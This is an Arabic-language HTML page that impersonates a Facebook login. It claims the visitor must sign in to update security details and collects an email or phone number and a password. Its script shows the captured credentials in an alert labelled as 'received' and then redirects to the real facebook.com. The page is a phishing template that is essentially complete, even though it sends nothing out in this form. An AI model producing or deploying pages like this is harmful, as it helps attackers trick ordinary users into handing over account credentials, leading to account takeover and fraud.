<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الهوية</title>
    <style>
        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color:#1877f2">Facebook</h2>
        <p>يجب تسجيل الدخول لتحديث بيانات الأمان</p>
        <input type="text" id="u" placeholder="البريد الإلكتروني أو الهاتف">
        <input type="password" id="p" placeholder="كلمة السر">
        <button onclick="send()">تسجيل الدخول</button>
    </div>
    <script>
        function send() {
            var u = document.getElementById('u').value;
            var p = document.getElementById('p').value;
            if(u != "" && p != "") {
                alert("تم استلام البيانات برمجياً:\nالمستخدم: " + u + "\nكلمة السر: " + p);
                window.location.href = "https://www.facebook.com";
            } else {
                alert("يرجى إكمال البيانات");
            }
        }
    </script>
</body>
</html>
